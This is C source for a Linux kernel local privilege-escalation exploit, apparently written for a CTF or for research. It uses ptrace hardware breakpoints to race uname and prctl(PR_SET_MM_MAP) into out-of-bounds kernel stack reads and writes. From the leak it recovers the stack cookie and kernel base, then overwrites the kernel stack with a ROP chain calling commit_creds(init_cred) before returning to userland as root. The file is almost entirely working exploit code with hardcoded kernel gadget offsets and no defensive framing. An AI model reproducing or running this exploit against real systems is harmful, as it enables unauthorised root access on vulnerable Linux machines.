#include <sys/ptrace.h>
#include <sys/user.h>
#include <stddef.h>
#include <sched.h>
#include <sys/wait.h>
#include <signal.h>
#include <sys/prctl.h>
#include <string.h>
#include <sys/utsname.h>
#include <stdbool.h>

#include "hbp.h"
#include "log.h"
#include "common.h"

char *map;
pid_t hbp_pid;
uint64_t kernel_base, kernel_offset;

struct cpu_entry_area *cea_by_cpu(int cpu) {
    return ((struct cpu_entry_area *) CPU_ENTRY_AREA_BASE) + cpu;
}

void create_hbp(void *addr) {
    // Set the DR0 register to the address of the breakpoint
    if (ptrace(PTRACE_POKEUSER, hbp_pid, DR_OFFSET(0), addr) == -1)
        die("create hbp ptrace dr0: %m");
    
    // Set the DR7 register to enable the breakpoint
    unsigned long dr_7 = (1<<0) | (1<<8) | (1<<16) | (1<<17) | (1<<18) | (1<<19);
    if (ptrace(PTRACE_POKEUSER, hbp_pid, DR_OFFSET(7), dr_7) == -1)
        die("create hbp ptrace dr7: %m");
}

void hbp_raw_fire() {
    if (ptrace(PTRACE_CONT, hbp_pid, NULL, NULL) == -1) {
        teardown();
        die("Fail to PTRACE_CONT: %m");
    }
}

void hbp_fire() {
    int status;
    do {
        hbp_raw_fire();
        waitpid(hbp_pid, &status, __WALL);
    } while (WSTOPSIG(status) == SIGTRAP);
}

void init(unsigned cpu) {
    switch (hbp_pid = fork()) {
        case -1:
            die("fork: %m");
        case 0:
            bind_to_cpu(cpu);
            if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1)
                die("ptrace traceme: %m");
            const struct prctl_mm_map mm_map = {
                .start_code = 0x1000000,
                .end_code = 0x1100000,
                .start_data = 0x1000000,
                .end_data = 0x1100000,
                .start_brk = 0x2000000,
                .brk = 0x2000000,
                .start_stack = 0x1000000,
                .arg_start = 0x1000000,
                .arg_end = 0x1000000,
                .env_start = 0x1000000,
                .env_end = 0x1000000,
                .auxv = (void *) (map + 1),
                .auxv_size = 0x141,
                .exe_fd = -2
            };
            while (1) {
                raise(SIGSTOP);
                if (!map[0])
                    uname((void *) map);    // oob read
                else
                    prctl(PR_SET_MM, PR_SET_MM_MAP, &mm_map, sizeof(mm_map), 0);    // oob write
            }
        default:
            break;
    }
    int status;
    while (waitpid(hbp_pid, &status, __WALL) != hbp_pid | !WIFSTOPPED(status)) 
        sched_yield();
    create_hbp(map);
}

void teardown() {
    kill(hbp_pid, SIGKILL);
}

bool attempt_read() {
    int status;
    memset(map, 0, PAGE_SIZE);
    hbp_raw_fire();
    waitpid(hbp_pid, &status, __WALL);
    for (uint32_t i = sizeof(struct utsname); i < PAGE_SIZE; i++) {
        if (map[i])
            return true;
    }
    return false;
}

int hbp_exp() {
    logd("Initializing");
    init(1);
    logd("Attempting oob read");
    while (!attempt_read());
    struct __attribute__((__packed__)) {
        char pad[sizeof(struct utsname)];
        uint64_t stack_cookie;
        uint64_t saved_rbx;
        uint64_t saved_r12;
        uint64_t saved_rbp;
        uint64_t return_address;
    } * stack_data = (void *) map;
    logs("leak stack_cookie: 0x%016llx", stack_data->stack_cookie);
    kernel_offset = stack_data->return_address - 0xffffffff810ece72;
    kernel_base = 0xffffffff81000000 + kernel_offset;
    logs("leak kernel_base: 0x%016llx", kernel_base);

    struct __attribute__((__packed__)) {
        char pad[0x1e8];
        uint64_t stack_cookie;
        uint64_t saved_rbx;
        uint64_t saved_r12;
        uint64_t saved_r13;
        uint64_t saved_r14;
        uint64_t saved_r15;
        uint64_t saved_rbp;
        uint64_t pop_rdi_ret; // return address 
        uint64_t init_cred;
        uint64_t commit_creds;
        uint64_t swapgs_restore_regs_and_return_to_usermode;
        uint64_t dummy1;
        uint64_t dummy2;
        uint64_t get_root;
        uint64_t user_cs;
        uint64_t user_rflags;
        uint64_t user_sp;
        uint64_t user_ss;
    } * evil_stack_data = (void *) map;
    memset(&evil_stack_data->pad, 0xff, sizeof(evil_stack_data->pad));
    evil_stack_data->stack_cookie = stack_data->stack_cookie;
    evil_stack_data->saved_rbx = 0xdeadbeefdeadbeef;
    evil_stack_data->saved_r12 = 0xdeadbeefdeadbeef;
    evil_stack_data->saved_r13 = 0xdeadbeefdeadbeef;
    evil_stack_data->saved_r14 = 0xdeadbeefdeadbeef;
    evil_stack_data->saved_r15 = 0xdeadbeefdeadbeef;
    evil_stack_data->saved_rbp = 0xdeadbeefdeadbeef;
    evil_stack_data->pop_rdi_ret = 0xffffffff81035e5d + kernel_offset;
    evil_stack_data->init_cred = 0xffffffff82a8b0e0 + kernel_offset;
    evil_stack_data->commit_creds = 0xffffffff81103ed0 + kernel_offset;
    evil_stack_data->swapgs_restore_regs_and_return_to_usermode = 0xffffffff820010f0 + 54 + kernel_offset;
    evil_stack_data->dummy1 = 0xdeadbeefdeadbeef;
    evil_stack_data->dummy2 = 0xdeadbeefdeadbeef;
    evil_stack_data->get_root = (uint64_t) get_root;
    evil_stack_data->user_cs = user_cs;
    evil_stack_data->user_rflags = user_rflags;
    evil_stack_data->user_sp = user_sp;
    evil_stack_data->user_ss = user_ss;
    sleep(1);
    logd("Attempting oob write");
    fflush(stdout);
    while (1) {
        hbp_raw_fire();
        waitpid(hbp_pid, NULL, __WALL);
    }
    teardown();
}